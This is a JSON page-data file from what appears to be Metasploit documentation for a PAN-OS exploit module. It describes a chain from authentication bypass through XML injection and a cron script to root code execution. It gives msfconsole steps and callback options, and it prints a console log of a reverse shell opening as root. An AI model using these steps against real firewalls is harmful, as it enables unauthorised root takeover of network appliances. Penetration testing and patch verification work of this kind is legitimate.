{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/panos_readsessionvars","result":{"data":{"moduleMetadataJson":{"id":"31a4fa83-6dfa-5010-aef0-708eead439eb","name":"Palo Alto Networks readSessionVarsFromFile() Session Corruption","fullname":"exploit/linux/http/panos_readsessionvars","description":"This module exploits a chain of vulnerabilities in Palo Alto Networks products running\n        PAN-OS versions prior to 6.1.19, 7.0.19, 7.1.14, and 8.0.6. This chain starts by using\n        an authentication bypass flaw to to exploit an XML injection issue, which is then\n        abused to create an arbitrary directory, and finally gains root code execution by\n        exploiting a vulnerable cron script. This module uses an initial reverse TLS callback\n        to stage arbitrary payloads on the target appliance. The cron job used for the final\n        payload runs every 15 minutes by default and exploitation can take up to 20 minutes.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/panos_readsessionvars","documentationSlug":"/modules/documentation/exploit/linux/http/panos_readsessionvars"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>This module exploits a chain of vulnerabilities in Palo Alto Networks products running\nPAN-OS versions prior to 6.1.19, 7.0.19, 7.1.14, and 8.0.6. This chain starts by using\nan authentication bypass flaw to to exploit an XML injection issue, which is then\nabused to create an arbitrary directory, and finally gains root code execution by\nexploiting a vulnerable cron script. This module uses an initial reverse TLS callback\nto stage arbitrary payloads on the target appliance. The cron job used for the final\npayload runs every 15 minutes by default and exploitation can take up to 20 minutes.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This exploit was specifically written against PAN-OS 7.1.0 running in a QEMU (kvm) virtual machine.\nThis VM is not generally available, but the specific disk image used was <code class=\"language-text\">PA-VM-KVM-7.1.0.qcow2</code>.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li><code class=\"language-text\">use exploit/linux/http/panos_readsessionvars</code></li>\n<li><code class=\"language-text\">set RHOST [IP]</code></li>\n<li><code class=\"language-text\">exploit</code></li>\n<li>You should get a session (eventually)</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p><strong>CBHOST</strong> The callback listener address if the default is not accurate (port forwarding, etc)</p>\n<p><strong>CBPORT</strong> The callback listener port</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(linux/http/panos_readsessionvars) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.122.1:4444\n[*] Creating our corrupted session ID...\n[*] Verifying that we can access the debug console with our corrupted session ID...\n[*] Calling Administrator.get to create directory under /opt/pancfg/mgmt/logdb/config/1/...\n[*] Waiting up to 20 minutes for the cronjob to fire and execute...\n[*] Waiting for a session, 1200 seconds left...\n[*] Waiting for a session, 1169 seconds left...\n[*] Waiting for a session, 1138 seconds left...\n[*] Waiting for a session, 1107 seconds left...\n[*] Waiting for a session, 1076 seconds left...\n[*] Waiting for a session, 1044 seconds left...\n[*] Waiting for a session, 1013 seconds left...\n[*] Waiting for a session, 982 seconds left...\n[*] Waiting for a session, 951 seconds left...\n[*] Waiting for a session, 920 seconds left...\n[+] Sending payload of 67 bytes to 192.168.122.98:39499...\n[*] Command shell session 7 opened (192.168.122.1:4444 -&gt; 192.168.122.98:44858) at 2018-05-05 15:45:02 -0500\n[!] Remember to manually purge the base directory: &#39;rm -rf /opt/pancfg/mgmt/logdb/config/1/&#39;\n[*] Shutting down payload stager listener...\n\nid\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"31a4fa83-6dfa-5010-aef0-708eead439eb"}}}